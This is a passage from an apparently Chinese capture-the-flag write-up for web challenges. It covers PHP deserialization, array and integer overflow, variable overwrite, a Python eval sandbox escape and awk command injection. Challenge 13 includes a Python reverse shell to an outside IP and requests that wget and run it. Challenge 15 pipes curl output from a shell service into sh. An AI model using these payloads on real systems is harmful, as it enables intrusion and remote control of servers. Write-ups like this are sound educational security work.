punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\;|\(|\)/"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和上面 payload 一样</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[GET]num=114514%2B1805296<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7-TapTapTap"><a href="#7-TapTapTap" class="headerlink" title="7. TapTapTap"></a>7. TapTapTap</h3><p>阅读 JS 源码</p><p><img src="/../../../pic/Pasted%20image%2020221111233216.png"></p><p>base64 解码后获得提示</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Your flag is in /secret_path_you_do_not_know/secretfile.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-Webshell"><a href="#8-Webshell" class="headerlink" title="8. Webshell"></a>8. Webshell</h3><p>简单的 PHP 反序列化</p><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "Hello World!"'</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$serializecmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$unserializecmd</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serializecmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$unserializecmd</span><span class="token operator">-&gt;</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>POC</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'tac f*'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Webshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-化零为整"><a href="#9-化零为整" class="headerlink" title="9. 化零为整"></a>9. 化零为整</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你太长了！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$result</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"大牛"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 URL 编码后拼接</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[GET]1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="10-无一幸免"><a href="#10-无一幸免" class="headerlink" title="10. 无一幸免"></a>10. 无一幸免</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[GET]0=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="11-无一幸免-FIXED"><a href="#11-无一幸免-FIXED" class="headerlink" title="11. 无一幸免_FIXED"></a>11. 无一幸免_FIXED</h3><p>题目直接给出了源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使数组溢出</p><pre class="line-numbers language-none"><code class="language-none">?0=9223372036854775807<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="12-传说之下（雾）"><a href="#12-传说之下（雾）" class="headerlink" title="12. 传说之下（雾）"></a>12. 传说之下（雾）</h3><p><img src="/../../../pic/Pasted%20image%2020221119153109.png"></p><p>一个 js 游戏，过关条件为分数达到 2077</p><p><img src="/../../../pic/Pasted%20image%2020221119155158.png"></p><p>运行之后点击调试暂停</p><p><img src="/../../../pic/Pasted%20image%2020221119155223.png"></p><p>在作用域中可以看到参数 score 即为分数参数，将其修改为 2078 然后随便吃一个刷新分数后在控制台获取到 flag</p><p><img src="/../../../pic/Pasted%20image%2020221119155328.png"></p><h3 id="13-算力超群"><a href="#13-算力超群" class="headerlink" title="13. 算力超群"></a>13. 算力超群</h3><p>python 的 eval 使用自带类进行命令执行</p><p>写个 exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"121.37.217.131"</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">import</span> pty<span class="token punctuation">;</span> pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>放到服务器上让题目环境下载</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[GET]_calculate?number1=1&amp;operator=%2b&amp;number2=1,__import__('os').system('wget%20121.37.217.131/exp.py')%2b2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[GET]_calculate?number1=1&amp;operator=%2b&amp;number2=1,__import__('os').system('python3%20exp.py')%2b2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Get Shell</p><p><img src="/../../../pic/Pasted%20image%2020221112005954.png"></p><p><a href="https://xz.aliyun.com/t/">https://xz.aliyun.com/t/</a></p><h3 id="14-算力升级"><a href="#14-算力升级" class="headerlink" title="14. 算力升级"></a>14. 算力升级</h3><p>本质上是一个pyjail的题，如何绕过执行的限制。可以看到源码对于输入的限制是两个正则，要求要么是数字，要么是dir(gmpy2)中的内容。我们可以在自己的环境中试一下，发现gmpy2.__builtins__是含有eval的，思路就是使用eval和dir(gmpy2)中的内容拼接字符串，payload生成脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token operator">=</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token keyword">import</span> gmpy2payload<span class="token operator">=</span><span class="token string">"gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]("</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token string">"/'(). "</span><span class="token punctuation">:</span>                temp_index<span class="token operator">=</span><span class="token number">0</span>                temp_string<span class="token operator">=</span><span class="token string">'x'</span><span class="token operator">*</span><span class="token number">20</span>                <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> j<span class="token punctuation">.</span>find<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_string<span class="token punctuation">)</span><span class="token punctuation">:</span>                                        temp_string<span class="token operator">=</span>j                                        temp_index<span class="token operator">=</span>j<span class="token punctuation">.</span>find<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                payload<span class="token operator">+=</span><span class="token string-interpolation"><span class="token string">f'\'</span><span class="token interpolation"><span class="token punctuation">{</span>temp_string<span class="token punctuation">}</span></span><span class="token string">\'[</span><span class="token interpolation"><span class="token punctuation">{</span>temp_index<span class="token punctuation">}</span></span><span class="token string">]+'</span></span>        <span class="token keyword">else</span><span class="token punctuation">:</span>                payload<span class="token operator">+=</span><span class="token string-interpolation"><span class="token string">f'\"</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">\"+'</span></span>payload<span class="token operator">=</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">')'</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得 payload</p><pre class="line-numbers language-none"><code class="language-none">gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cmp'[0]+'ai'[0]+'cot'[2]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221119202531.png"></p><h3 id="15-easyPytHon-P"><a href="#15-easyPytHon-P" class="headerlink" title="15. easyPytHon_P"></a>15. easyPytHon_P</h3><p>关键代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>cmd<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> param<span class="token punctuation">,</span> __file__<span class="token punctuation">]</span><span class="token punctuation">,</span> cwd<span class="token operator">=</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只能控制 cmd 为三位</p><p>可以使用 awk 执行命令</p><pre class="line-numbers language-none"><code class="language-none">cmd=awk&amp;param={system("curl https://your-shell.com/121.37.217.131:10089|sh")}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者是</p><pre class="line-numbers language-none"><code class="language-none">cmd=ls&amp;param=.cmd=cat&amp;param=flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="16-遍地飘零"><a href="#16-遍地飘零" class="headerlink" title="16. 遍地飘零"></a>16. 遍地飘零</h3><p>直接给出了题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$zeros</span><span class="token operator">=</span><span class="token string double-quoted-string">"000000000000000000000000000000"</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">==</span><span class="token string double-quoted-string">"000000000000000000000000000000"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"好多零"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"没有零，仔细看看输入有什么问题吧"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后输出的为 <code>$_GET</code>，将其转换为一个变量即可</p><pre class="line-numbers language-none"><code class="language-none">?_GET=flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="17-茶歇区"><a href="#17-茶歇区" class="headerlink" title="17. 茶歇区"></a>17. 茶歇区</h3><p>简单地整数溢出</p><p><img src="/../../../pic/Pasted%20image%2020221119162208.png"></p><pre class="line-numbers language-none"><code class="language-none">a=111&amp;b=0&amp;c=0&amp;d=0&amp;e=922337203685477580&amp;submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="18-小舔田？"><a href="#18-小舔田？" class="headerlink" title="18. 小舔田？"></a>18. 小舔田？</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Moon</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"月亮"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"我是"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"快来赏我"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Ion_Fan_Princess</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"牛夫人"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">nickname</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"小甜甜"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">nickname</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"。\n"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"\t\t\t\t\t\t\t\t\t\t----"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">nickname</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ion_Fan_Princess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单地反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Moon</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"月亮"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Ion_Fan_Princess</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"牛夫人"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Moon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ion_Fan_Princess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 